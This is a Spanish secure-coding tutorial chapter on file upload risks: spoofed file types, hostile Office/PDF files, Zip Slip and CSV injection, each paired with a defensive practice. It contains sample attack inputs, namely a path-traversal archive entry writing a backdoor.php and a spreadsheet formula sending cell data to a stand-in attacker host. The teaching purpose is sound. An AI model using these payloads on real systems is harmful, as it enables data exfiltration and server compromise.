---
order: 13
---

# Subida de archivos: validación, Zip Slip, CSV Injection

Aceptar un archivo enviado por el usuario (foto de perfil, justificante, importación de datos) abre una superficie de ataque aparte: a diferencia de un campo de texto, un archivo tiene un TIPO, un CONTENIDO estructurado y un TAMAÑO, y cada uno se explota de forma distinta. Este capítulo cubre las tres trampas más frecuentes.

## Validar el tipo de un archivo: nunca solo por la extensión

El nombre del archivo y la cabecera `Content-Type` que envía el navegador durante una subida son información proporcionada por el CLIENTE, y por tanto falsificable como cualquier otro dato de una petición (ver el principio ya planteado en [Las grandes familias de fallos de seguridad](/?c=securite&s=cybersecurite&p=types-de-failles): no confiar nunca en un dato externo sin validarlo).

```text
Archivo enviado realmente: script.php renombrado como foto.jpg
Cabecera Content-Type enviada por el navegador: image/jpeg   (fácil de falsificar)
Extensión del nombre de archivo: .jpg                         (solo un nombre, no contenido)

-> Si el servidor SOLO verifica la extensión/el Content-Type declarado,
   un archivo ejecutable puede hacerse pasar por una imagen
```

| Verificación | Fiabilidad | Lo que impide |
|---|---|---|
| Extensión del nombre de archivo | Baja: solo texto proporcionado por el cliente | Nada garantizado por sí sola |
| `Content-Type` declarado por el navegador | Baja: también proporcionado por el cliente | Nada garantizado por sí solo |
| Firma binaria real del archivo (*magic bytes*, primeros bytes que identifican el formato real) | Alta: se lee en el contenido, no la declara el cliente | Un ejecutable disfrazado de imagen con una extensión falsa |
| Archivo guardado fuera de la carpeta que el servidor web ejecuta | Alta: aunque un archivo malicioso pase de todos modos, nunca podrá ejecutarse | Un script subido ejecutado directamente accediendo a su URL |

> **Trampa:** validar solo la extensión o el `Content-Type` declarado, ambos proporcionados por el cliente y, por tanto, falsificables sin esfuerzo.
>
> **Buena práctica:** verificar la firma binaria real del contenido (biblioteca específica del lenguaje usado), imponer un tamaño máximo y guardar los archivos subidos en una carpeta que el servidor web no sepa ejecutar como código, sea cual sea el resultado de la validación.

## Archivo especializado con trampa (PDF, Excel, Word)

Un documento de Office (`.docx`, `.xlsx`) es en realidad un ARCHIVO zip que contiene varios archivos XML; un PDF es un formato de objetos anidados, con su propia sintaxis. Procesar un archivo así (extracción de texto, OCR, conversión) supone confiar en una biblioteca de análisis ESPECIALIZADA frente a un contenido potencialmente diseñado para explotarla, más allá del simple caso "archivo vacío o truncado" ya visto como caso límite general.

| Riesgo | Lo que explota |
|---|---|
| Bomba de descompresión interna | Un `.xlsx`/`.docx` es un zip: se aplica el mismo principio que una [bomba de descompresión clásica](/?c=securite&s=cybersecurite&p=surcharge-et-deni-de-service-applicatif), escondido en un formato que a primera vista no parece un archivo comprimido |
| Fallo de la biblioteca de análisis ante un documento malformado | Una biblioteca de procesamiento de documentos (extracción PDF/OCR, lectura de Excel) no está pensada en primer lugar para resistir un contenido hostil; un documento malformado a propósito puede hacerla fallar e incluso, en raros casos, revelar un comportamiento no previsto por sus autores |
| Contenido activo (macros, enlaces externos) | Un documento de Office puede incluir una macro que se ejecuta al abrirlo; aunque tu procesamiento automático no ejecute nunca una macro, un archivo generado a partir de un documento subido (vista previa, conversión) que la conservara la transmitiría tal cual a cualquiera que lo abra después |

> **Buena práctica:** procesar un documento subido en un entorno aislado si la biblioteca de análisis usada no ofrece una garantía fuerte de robustez (sandbox, límite de tiempo/memoria de ejecución); eliminar todo contenido activo (macros) durante una conversión en lugar de conservarlo por defecto.

## Zip Slip: una ruta con trampa dentro de un archivo comprimido

Un archivo comprimido (`.zip`, `.tar`) que la aplicación extrae automáticamente (importación masiva, descompresión de un tema, depósito de archivos agrupados) contiene una lista de rutas de archivos internas, definidas por quien creó el archivo. Una ruta diseñada para salir de la carpeta de destino prevista puede escribir en cualquier otro lugar del disco si la extracción no la verifica.

```text
Contenido esperado de una entrada del archivo:  images/foto.jpg
  -> extraído en: /var/www/uploads/images/foto.jpg   (dentro de la carpeta prevista)

Entrada con trampa:  ../../../../var/www/html/backdoor.php
  -> si la herramienta de extracción sigue esta ruta tal cual, el archivo se escribe
     FUERA de la carpeta de destino prevista, potencialmente en una carpeta
     EJECUTABLE por el servidor web
```

El nombre viene de la idea de un archivo que se "desliza" (*slip*) fuera de la carpeta de destino durante la extracción, exactamente el mismo principio que el [recorrido de directorios](/?c=securite&s=cybersecurite&p=types-de-failles) (*path traversal*), aplicado esta vez a cada entrada de un archivo comprimido en lugar de a un único nombre de archivo proporcionado directamente.

> **Trampa:** extraer un archivo comprimido subido con la función de descompresión estándar del lenguaje, sin verificar que cada ruta de entrada se quede dentro de la carpeta de destino prevista.
>
> **Buena práctica:** antes de escribir cada archivo extraído, verificar que su ruta final resuelta sea una subruta de la carpeta de destino (rechazar toda entrada que contenga `..` o que se resuelva fuera), o usar una biblioteca de extracción que ya aplique esta verificación.

## CSV Injection: una fórmula en lugar de un simple dato

Un archivo `.csv` generado por la aplicación (exportación de datos, informe) y destinado a abrirse en una hoja de cálculo (Excel, Google Sheets) conlleva un riesgo propio de ese formato de destino: la hoja de cálculo interpreta toda celda que empieza por `=`, `+`, `-` o `@` como una FÓRMULA que calcular, no como texto sin formato.

```text
Dato del usuario guardado tal cual:
  =HIPERVINCULO("http://atacante.example/robo?c="&A1;"Haz clic aquí")

Exportación CSV del campo:
  =HIPERVINCULO("http://atacante.example/robo?c="&A1;"Haz clic aquí")

Al abrir el CSV en Excel: la celda muestra un enlace clicable, "Haz clic aquí",
que en realidad envía el contenido de otra celda (A1) a un servidor del atacante
en cuanto se hace clic; peor aún, algunas fórmulas se ejecutan SIN necesidad de hacer clic
```

Este riesgo afecta a cualquier dato del usuario exportado tal cual (apodo, comentario, nombre de archivo): nada en el propio formato CSV escapa estos caracteres; es únicamente la hoja de cálculo la que los interpreta así al abrir el archivo.

> **Trampa:** exportar un dato del usuario en bruto a un CSV, pensando que un archivo CSV "no es más que texto" y que, por tanto, no puede ejecutar nada.
>
> **Buena práctica:** anteponer un apóstrofo (`'`) o un espacio a todo valor exportado que empiece por `=`, `+`, `-` o `@`, para que la hoja de cálculo lo muestre como texto sin formato en lugar de interpretarlo como una fórmula.

---

## 📋 Resumen

| | |
|---|---|
| **Para recordar** | Un archivo subido conlleva varios riesgos distintos de un campo de texto clásico: su tipo declarado (extensión/`Content-Type`) lo puede falsificar el cliente; un documento de Office/PDF es un formato estructurado con su propia superficie de ataque; un archivo comprimido puede contener rutas internas con trampa (Zip Slip); una exportación CSV reabierta en una hoja de cálculo puede contener fórmulas ejecutables (CSV Injection). |
| **Herramientas utilizables** | Detección de la firma binaria real (biblioteca específica del lenguaje); entorno aislado para analizar documentos estructurados; verificación de la ruta resuelta antes de extraer un archivo comprimido; escape de los caracteres `=`/`+`/`-`/`@` al inicio de una celda CSV. |
| **Trampas a evitar** | Validar una subida solo por la extensión/el `Content-Type` declarado. Tratar un documento de Office/PDF como un simple archivo sin superficie de ataque propia. Extraer un archivo comprimido sin verificar que cada ruta se quede en la carpeta prevista. Exportar un dato del usuario en bruto a un CSV. |
| **Buenas prácticas** | Verificar la firma binaria real, guardar fuera de una carpeta ejecutable, imponer un tamaño máximo. Aislar el análisis de un documento estructurado (sandbox, límite de recursos). Rechazar toda ruta de archivo comprimido que salga de la carpeta de destino. Escapar toda celda CSV que empiece por un carácter de fórmula. |
